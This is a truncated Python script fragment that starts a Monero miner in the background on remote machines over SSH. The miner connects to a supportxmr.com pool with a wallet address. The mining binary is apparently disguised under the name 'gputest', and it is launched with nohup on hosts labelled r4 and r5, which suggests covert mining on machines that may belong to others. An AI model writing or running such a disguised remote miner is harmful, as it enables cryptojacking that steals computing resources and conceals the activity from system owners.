...
def start_r4():
  cmd="nohup ~/xiaodong/xmrMiner/build/gputest -o stratum+tcp://fr04.supportxmr.com:7777 -u "+address+" -p r4  &"
...
def start_r5(ssh):
  success_flag = False;
  cmd="nohup ~/xiaodong/xmrMiner/build/gputest -o stratum+tcp://fr04.supportxmr.com:7777 -u "+address+" -p r5  &"
  stdin,stdout,stderr =  ssh.exec_command(cmd);
def kill_r4():
